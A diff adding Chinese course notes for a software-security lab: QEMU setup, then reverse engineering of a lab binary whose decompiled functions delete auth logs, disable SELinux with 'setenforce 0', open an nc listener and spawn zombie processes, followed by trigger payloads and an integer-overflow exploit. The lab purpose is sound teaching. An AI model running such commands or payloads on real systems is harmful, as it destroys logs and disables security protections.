@@ -1,0 +1,203 @@
+课程设计
+
+# 软件安全课程设计
+**任务资料**
+[pcap-sample.zip](\download\信息与网络安全课程设计\pcap-sample.zip)
+[网络与系统安全课程设计指导手册-2025v3](\download\信息与网络安全课程设计\网络与系统安全课程设计指导手册-2025v3)
+
+## Task1
+### 依赖安装
+```bash
+# 依赖安装
+sudo apt-get install libpcap-dev
+```
+**下面的代码只实现了基本的功能**
+[task1_version0.zip](\download\信息与网络安全课程设计\task1_version0.zip)
+这段代码只实现了从pcap-sample.c增加代码实现顺序包重组的功能，如果需要进一步实现扩展功能，则需要读者自行实现。
+## TASK2
+**任务资源**
+[demo.c](\download\信息与网络安全课程设计\demo.c)
+
+在调试过程中  可以使用下列命令允许端口复用从而便于调试避免**bind failed: Address already in use**，下次重启失效。
+```bash
+sudo sysctl -w net.ipv4.tcp_tw_reuse=1
+```
+### QEMU安装
+[QEMU安装](https://www.cnblogs.com/from-zero/p/12290170.html)
+[编译文档](https://wiki.qemu.org/Hosts/Linux)
+```bash
+# 依赖安装
+sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev ninja-build
+sudo apt-get install git-email
+sudo apt-get install libaio-dev libbluetooth-dev libcapstone-dev libbrlapi-dev libbz2-dev
+sudo apt-get install libcap-ng-dev libcurl4-gnutls-dev libgtk-3-dev
+sudo apt-get install libibverbs-dev libjpeg8-dev libncurses5-dev libnuma-dev
+sudo apt-get install librbd-dev librdmacm-dev
+sudo apt-get install libsasl2-dev libsdl2-dev libseccomp-dev libsnappy-dev libssh-dev
+sudo apt-get install libvde-dev libvdeplug-dev libvte-2.91-dev libxen-dev liblzo2-dev
+sudo apt-get install valgrind xfslibs-dev
+sudo apt-get install libnfs-dev libiscsi-dev
+
+# QEMU安装
+wget https://download.qemu.org/qemu-9.0.1.tar.xz
+tar xvJf qemu-9.0.1.tar.xz
+cd qemu-9.0.1
+./configure
+make
+```
+或者直接安装
+```bash
+sudo apt-get update
+sudo apt-get install qemu
+```
+
+### 模拟运行
+```bash
+gcc -m32 -fno-stack-protector demo.c -o demo 
+``` 
+发现错误
+![](image.png)
+```bash
+# 安装32位依赖
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install gcc-multilib libc6-dev-i386
+```
+模拟运行
+```bash
+qemu-i386 -strace -d in_asm -D trace.log demo
+
+qemu-i386 -strace -d in_asm -D trace.log cs-test
+#单开另外一个终端输入下面的命令
+telnet 127.0.0.1 12345
+# 输入1AB  实验恶意代码执行的部分
+# 输入12345678X 实验缓冲区溢出部分
+```
+对于demo的标准解题答案
+[demo程序的标准答案](\download\信息与网络安全课程设计\demo程序的标准答案.pdf)
+### cs-test逆向分析
+根据已知条件，我们知道cs-test和demo.c的源码及其相似。之后我们查看cs-test被IDA反汇编的源码
+![](image-1.png)
+我们需要满足contains_you_are_the_best函数的条件才可以执行内部的恶意代码
+进入contains_you_are_the_best函数
+![](image-2.png)
+发现函数的逻辑是找youarethebest的子串。只要我们输入的字符串中有这个子串，即可通过这个条件
+现在执行恶意功能
+执行顺序为Mal_func3-->Mal_func4
+```C
+int Mal_func1
+{
+  puts("[+] Deleting system logs...");
+  return remove("/var/log/auth.log");
+}
+int Mal_func2()
+{
+  if ( sub_5DD41290("/home/cs-test/Test/hustlogo.png", "system.sh") )
+    return sub_5DD41220("rename failed");
+  if ( sub_5DD41330("system.sh", 511) )
+    return sub_5DD41220("chmod failed");
+  sub_5DD41260("[+] Changing file permission...");
+  if ( sub_5DD41270("./system.sh") == -1 )
+    return sub_5DD41220("system failed");
+  else
+    return sub_5DD41260("Script executed successfully.");
+}
+- Mal_func3
+int Mal_func3()
+{
+  sub_5DD411F0("Executing command: %s\n", "nc -l -p 54321 > hustlogo.png");
+  if ( sub_5DD41270("nc -l -p 54321 > hustlogo.png") == -1 )
+    return sub_5DD41220("system failed");
+  else
+    return sub_5DD41260("Command executed successfully.");
+}
+- Mal_func4
+int Mal_func4()
+{
+  int result; // eax
+  int v1; // eax
+  int v2; // [esp+Ch] [ebp-Ch]
+
+  result = sub_5DD41260("[+] Creating zombie processes...");
+  v2 = 0;
+  while ( v2 <= 9 )
+  {
+    result = sub_5DD412E0();
+    if ( !result )
+    {
+      ++v2;
+      v1 = sub_5DD41240();
+      sub_5DD411F0("I am child, my pid = %d\n", v1);
+      result = sub_5DD41280((int)&GLOBAL_OFFSET_TABLE_);
+    }
+  }
+  return result;
+}
+
+int Mal_func5()
+{
+  sub_5DD41260("[+] Disabling SELinux...");
+  return sub_5DD41270("setenforce 0");
+}
+
+void __cdecl Vul_func12(int dest_raw)
+{
+  char dest[24]; // [esp+Ch] [ebp-1Ch] BYREF
+
+  if ( *(char *)(dest_raw + 50) + *(char *)(dest_raw + 70) <= 19 )
+    strncpy(dest, (const char *)(dest_raw + 20), *(char *)(dest_raw + 50) + *(char *)(dest_raw + 70));
+  if ( dest[23] == '%' )
+    Vul_func345((int)dest);
+}
+```
+其中mal_func 1-5的payload为
+```python
+payload1="1AByouarethebest"     #
+payload2="128youarethebest"     #
+payload3="a"*65+"X"+"youarethebest"     # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXyouarethebest
+payload4="a"*43+"Y"+"youarethebest"     # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaYyouarethebest
+payload5="a"*35+"7"+(52-36)*"a"+'7'+"youarethebest" # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa7aaaaaaaaaaaaaaaa7youarethebest
+```
+
+难点在于Vul_func12的溢出
+目标显然是进入Vul_func345函数
+
+我们希望绕过这个判断语句if ( *(char *)(dest_raw + 50) + *(char *)(dest_raw + 70) <= 19 )
+**查看汇编源码发现**
+![](image-3.png)
+参与比较的dl参与了有符号扩展的movsx, 所以可以利用整数溢出漏洞来绕过这个判断语句, 从而向dest 填充目标字符串。
+所以可以先构建payload
+```python
+"a"*50+'\xff'+"a"*19+"\xff"+"youarethebest"
+```
+来绕过这个判断语句
+然后因为是从第20个字符开始复制的, 所以我们需要构建payload来填充前20个字符, 并且要保证dest[23] == '%'来进入Vul_func345函数
+所以更改后的的payload是:
+```python
+"a"*20+"a"*23+"%"+"a"*6+'\xff'+"a"*19+"\xff"+"youarethebest"
+```
+这样构造的payload的利用了整数溢出漏洞使系统崩溃，虚拟机会出现段错误,询问老师发现是给我们测试的cs-test版本不对,无法进入vul345
+
+更新后的vul345的代码为
+```disassembly
+int __cdecl Vul_func12(int a1)
+{
+  int result; // eax
+  char dest[24]; // [esp+Ch] [ebp-1Ch] BYREF
+
+  if ( *(char *)(a1 + 50) + *(char *)(a1 + 70) <= 19 )
+    strncpy(dest, (const char *)(a1 + 20), *(char *)(a1 + 50) + *(char *)(a1 + 70));
+  result = *(unsigned __int8 *)(a1 + 23);
+  if ( (_BYTE)result == '%' )
+    return Vul_func345(dest);
+  return result;
+}
+```
+此时触发Vul_func12中整数溢出漏洞的payload为
+```python
+payload6_int_overflow = "a"*50+'\xff'+"a"*19+"\xff"+"a"*7+"b"+"a"+"youarethebest"  # payload6整数溢出漏洞
+```
+此时触发Vul_func345函数的条件是dest[23] == '%'
+```python
+payload6_double_free = "a"*23+"%"*1+"a"*54+"b"+"a"+"youarethebest"       #触发vul345
+```
